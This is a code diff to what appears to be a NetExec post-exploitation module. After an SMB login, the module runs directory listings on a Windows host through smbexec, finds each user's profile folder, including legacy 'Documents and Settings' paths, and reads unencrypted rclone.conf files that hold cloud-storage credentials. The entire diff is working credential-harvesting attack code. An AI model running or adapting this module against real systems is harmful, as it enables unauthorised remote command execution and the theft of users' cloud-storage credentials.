@@ -28,22 +28,38 @@ class NXCModule:
 
     def on_login(self, context, connection):
         try:
-            output = connection.execute("dir C:\\Users", True, methods=["smbexec"])
+            output = connection.execute("dir C:\\", True, methods=["smbexec"])
         except Exception as e:
-            context.log.error(f"Failed to list C:\\Users: {e}")
+            context.log.error(f"Failed to list C:\\: {e}")
             return False
 
         if not output:
-            context.log.error("No output from dir C:\\Users")
+            context.log.error("No output from dir C:\\")
             return False
 
-        usernames = self.parse_user_dirs(output)
+        use_legacy = any("Documents and Settings" in line for line in output.splitlines())
+
+        base_path = (
+            '"C:\\Documents and Settings\\"' if use_legacy else "C:\\Users"
+        )
+
+        try:
+            user_list_output = connection.execute(f"dir {base_path}", True, methods=["smbexec"])
+        except Exception as e:
+            context.log.error(f"Failed to list {base_path}: {e}")
+            return False
+
+        usernames = self.parse_user_dirs(user_list_output)
         if not usernames:
             context.log.warning("No user directories found.")
             return False
 
         for username in usernames:
-            rclone_path = f"C:\\Users\\{username}\\AppData\\Roaming\\rclone\\rclone.conf"
+            if use_legacy:
+                rclone_path = f'"C:\\Documents and Settings\\{username}\\.config\\rclone\\rclone.conf"'
+            else:
+                rclone_path = f"C:\\Users\\{username}\\AppData\\Roaming\\rclone\\rclone.conf"
+
             context.log.info(f"Trying to read: {rclone_path}")
 
             try:
@@ -52,13 +68,14 @@ class NXCModule:
                 context.log.debug(f"[{username}] Failed to read {rclone_path}: {e}")
                 continue
 
-            if not file_output or "The system cannot find the path specified." in file_output:
+            if not file_output or "The system cannot find the" in file_output:
                 context.log.info(f"[{username}] rclone.conf not found.")
                 continue
 
             decoded = file_output
-            if "# Encrypted rclone configuration file" in decoded:
-                context.log.info(f"[{username}] Encrypted config — skipping.")
+
+            if "RCLONE_ENCRYPT_V0" in decoded:
+                context.log.fail(f"[{username}] Encrypted config — skipping.")
                 continue
 
             context.log.success(f"[{username}] rclone.conf found!")
